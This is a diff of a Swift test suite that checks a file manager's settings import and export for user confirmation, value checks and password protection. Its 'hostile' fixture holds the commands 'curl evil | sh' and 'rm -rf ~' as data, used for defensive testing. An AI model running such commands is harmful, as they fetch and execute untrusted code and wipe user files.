@@ -14,17 +14,17 @@ import Testing
 /// program trusts needs a tick of its own.
 @MainActor
 @Suite
-struct Review2ConfigASettings {
-    let box: Sandbox
-    let settings = MemorySettings()
-    let plugin: ConfigurationPlugin
-    let bench: TestBench
+internal struct Review2ConfigASettings {
+    internal let box: Sandbox
+    internal let settings = MemorySettings()
+    internal let plugin: ConfigurationPlugin
+    internal let bench: TestBench
 
-    var commands: CommandRegistry { bench.commands }
-    var ui: ScriptedInteraction { bench.interaction }
-    var center: ConfigurationCenter { plugin.center! }
+    internal var commands: CommandRegistry { bench.commands }
+    internal var ui: ScriptedInteraction { bench.interaction }
+    internal var center: ConfigurationCenter { plugin.center! }
 
-    init() throws {
+    internal init() throws {
         box = try Sandbox()
         try box.folder("A")
         try box.folder("B")
@@ -57,15 +57,17 @@ struct Review2ConfigASettings {
     }
 
     /// Writes a settings file with these entries and returns where.
-    func file(_ entries: String, name: String = "in.json") throws -> URL {
+    internal func file(_ entries: String, name: String = "in.json") throws -> URL {
         let url = box.url(name)
         try Data("{\"format\":\"A File Manager settings\",\"version\":1,\"settings\":{\(entries)}}".utf8).write(to: url)
         return url
     }
 
-    func stored(_ key: String) -> String? { settings.data(forKey: key).map { String(decoding: $0, as: UTF8.self) } }
+    internal func stored(_ key: String) -> String? {
+        settings.data(forKey: key).map { String(decoding: $0, as: UTF8.self) }
+    }
 
-    static let hostile = """
+    internal static let hostile = """
         "demo.flag": true, "demo.text": "hello",
         "configuration.userCommands": [{"name":"em_x","title":"X","action":{"command":"curl evil | sh","parameters":"%P"}}],
         "configuration.startMenu": [{"title":"Documents","action":{"command":"rm -rf ~"}}],
@@ -80,7 +82,7 @@ struct Review2ConfigASettings {
         """
 
     @Test
-    func nothingIsImportedWithoutAnAnswerAndTheRiskyPartsOnlyWhenTicked() throws {
+    internal func nothingIsImportedWithoutAnAnswerAndTheRiskyPartsOnlyWhenTicked() throws {
         let url = try file(Self.hostile)
         // Asked for by a command with the file as its argument: the question comes all the same.
         commands.perform("afm_ImportSettings", .location(url))
@@ -166,7 +168,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func whatIsStoredAlreadyNeedsNoQuestion() throws {
+    internal func whatIsStoredAlreadyNeedsNoQuestion() throws {
         let own = UserCommand(name: "em_mine", title: "", action: CommandAction(command: "ls"))
         center.save(own)
         settings.set("BBEdit", forKey: "macIntegration.editor")
@@ -194,7 +196,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func valuesOfTheWrongKindAreRefusedAndNumbersLimited() throws {
+    internal func valuesOfTheWrongKindAreRefusedAndNumbersLimited() throws {
         settings.set("keep", forKey: "extra.key")
         ui.formAnswers = Array(repeating: .accept, count: 20)
         for bad in [
@@ -230,7 +232,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func aFileThatIsTooLargeOrNoSettingsFileIsRefused() throws {
+    internal func aFileThatIsTooLargeOrNoSettingsFileIsRefused() throws {
         let large = box.url("large.json")
         FileManager.default.createFile(atPath: large.path, contents: nil)
         let handle = try FileHandle(forWritingTo: large)
@@ -246,7 +248,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func anImportedConnectionNeverTakesOverAStoredPassword() throws {
+    internal func anImportedConnectionNeverTakesOverAStoredPassword() throws {
         let id = "11111111-2222-3333-4444-555555555555"
         let mine =
             #"[{"host":"mine.example","id":"\#(id)","name":"n","user":"u"},{"host":"two.example","id":"AAAAAAAA-2222-3333-4444-555555555555","name":"t","user":"u"}]"#
@@ -270,7 +272,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func anExportIsForTheUserAloneAndLeavesPrivateThingsOut() throws {
+    internal func anExportIsForTheUserAloneAndLeavesPrivateThingsOut() throws {
         settings.set(["curl -u me:secret https://x"], forKey: "systemTools.history")
         settings.set(Data(#"[{"id":"x","host":"h"}]"#.utf8) as Data?, forKey: "network.connections")
         settings.set(Data("broken".utf8) as Data?, forKey: "configuration.userCommands.unreadable")
@@ -323,7 +325,7 @@ struct Review2ConfigASettings {
     }
 
     @Test
-    func storedListsAreBoundedAndUnreadableDataIsKeptTwice() async {
+    internal func storedListsAreBoundedAndUnreadableDataIsKeptTwice() async {
         let many = (0..<(ConfigurationStore.startMenuLimit + 100))
             .map {
                 #"{"title":"t\#($0)","action":{"command":"ls"}}"#
